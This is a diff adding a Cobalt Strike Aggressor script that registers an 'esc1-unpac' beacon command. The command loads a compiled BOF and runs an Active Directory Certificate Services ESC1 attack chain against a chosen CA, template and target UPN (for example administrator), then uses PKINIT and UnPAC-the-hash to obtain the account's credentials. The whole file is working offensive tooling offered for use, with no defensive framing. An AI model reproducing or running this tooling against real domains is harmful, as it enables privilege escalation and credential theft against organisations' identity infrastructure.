@@ -1,0 +1,58 @@
+# ESC1-unPAC - Cobalt Strike Aggressor Script
+# Complete ADCS ESC1 attack chain: ESC1 -> PKINIT -> UnPAC-the-hash
+
+# Pack string: [4-byte length][string][null]
+sub pack_str {
+    local('$s $slen $result');
+    $s = $1;
+    if ($s eq $null) { $s = ""; }
+    $slen = strlen($s) + 1;
+    $result = pack("I-", $slen) . $s . pack("B", 0);
+    return $result;
+}
+
+alias esc1-unpac {
+    local('$bid $ca $template $upn $kdc $nosid $bof $args $handle $data $sid_status');
+
+    $bid = $1;
+    $ca = $2;
+    $template = $3;
+    $upn = $4;
+    $kdc = $5;
+    $nosid = $6;
+
+    if ($ca eq "" || $template eq "" || $upn eq "") {
+        berror($bid, "Usage: esc1-unpac <CA> <Template> <UPN> [KDC] [nosid]");
+        berror($bid, "Example: esc1-unpac EVILCA1.evilcorp.net\\\\evilcorp-EVILCA1-CA ESC1Template administrator\@evilcorp.net");
+        return;
+    }
+
+    if ($kdc eq $null) { $kdc = ""; }
+    if ($nosid eq $null) { $nosid = ""; }
+
+    $bof = script_resource("bofs/ESC1-unPAC.x64.o");
+
+    if (!-exists $bof) {
+        berror($bid, "BOF not found: $bof");
+        return;
+    }
+
+    $sid_status = iff($nosid eq "nosid", "(without SID)", "(with SID)");
+    btask($bid, "ESC1-unPAC: CA= $+ $ca Template= $+ $template UPN= $+ $upn $sid_status");
+
+    $args = pack_str($ca) . pack_str($template) . pack_str($upn) . pack_str($kdc) . pack_str($nosid);
+
+    $handle = openf($bof);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "esc1-unpac",
+    "ESC1 + PKINIT + UnPAC-the-hash (complete ADCS attack chain)",
+    "Usage: esc1-unpac <CA> <Template> <UPN> [KDC] [nosid]"
+);
+
+println("[+] ESC1-unPAC loaded - esc1-unpac <CA> <Template> <UPN> [KDC] [nosid]");
